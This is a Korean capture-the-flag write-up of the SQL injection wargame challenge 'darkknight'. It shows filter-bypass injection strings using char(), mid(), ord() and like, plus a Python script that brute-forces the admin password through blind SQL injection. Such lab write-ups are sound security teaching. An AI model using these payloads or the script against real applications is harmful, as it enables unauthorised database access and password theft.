<img width="222" alt="스크린샷 2020-01-18 오후 7 45 53" src="https://user-images.githubusercontent.com/54495632/72662917-ecdcf900-3a2f-11ea-9d5a-c30d58d2425f.png">



12번 다크나이트



<img width="846" alt="스크린샷 2020-01-18 오후 7 46 01" src="https://user-images.githubusercontent.com/54495632/72662965-7987b700-3a30-11ea-990d-45a8feaa4afa.png">



if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 

pw와 no에서 공통적으로 작은 따옴표 ' 가 필터링 된다.
이를 우회하기 위해 " 큰 따옴표, char을 이용했다.

no에서 substr, ascii , = 가 필터링 된다.

substr은 바로 전 문제와 같이 mid 함수를 이용하여 우회할 수 있고
ascii는 같은 기능을 하는 ord 함수로 우회하였다.
=는 바로 전 문제와 같이 like를 이용했다.



<img width="812" alt="스크린샷 2020-01-18 오후 8 54 43" src="https://user-images.githubusercontent.com/54495632/72666087-34747c80-3a52-11ea-9121-763f33a7b76a.png">



length 함수엔 따로 필터링이 없어서
pw='' and no =""or id like char(97,100,109,105,110) and length(pw)like 8 과 같은 쿼리를 생각하여 pw의 길이를 찾았다. pw 길이 = 8
작은따옴표가 필터링되서 id like 'admin' 과 같이 쿼리를 줄 수 없어
'admin' 대신 char함수를 이용했다.



<img width="819" alt="스크린샷 2020-01-19 오전 12 26 21" src="https://user-images.githubusercontent.com/54495632/72666106-5837c280-3a52-11ea-8a50-07b598d28525.png">



다음과 같이 ord , mid , like 를 이용하여 문제를 해결했다.
pw=1&no=""||id like char(97,100,109,105,110) and ord(mid(pw,1,1))like%2048



<img width="279" alt="스크린샷 2020-01-19 오전 12 32 53" src="https://user-images.githubusercontent.com/54495632/72666195-4276cd00-3a53-11ea-891e-67c55b95941c.png">



import requests

cookies={'PHPSESSID':'쿠키값'}
url="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?"

pw=""
for i in range(1,9):
    for j in range(33,128):
        query="pw=&no=%22%22or%20id%20like%20char%2897%2C100%2C109%2C105%2C110%29%20and%20ord%28mid%28pw%2C"+str(i)+"%2C1%29%29like%20"+str(j)
        geturl=url+query
        res=requests.get(geturl,cookies=cookies)
        if((res.text).find("Hello admin")>0):
            pw+=chr(j)
            print (pw)
            break

print ("finish pw :"+pw)

문제 해결을 위해 사용한 파이썬 코드이다.



<img width="703" alt="스크린샷 2020-01-19 오전 12 34 20" src="https://user-images.githubusercontent.com/54495632/72666229-7f42c400-3a53-11ea-9b7b-76e1239fbb83.png">



pw값만 입력하면 clear!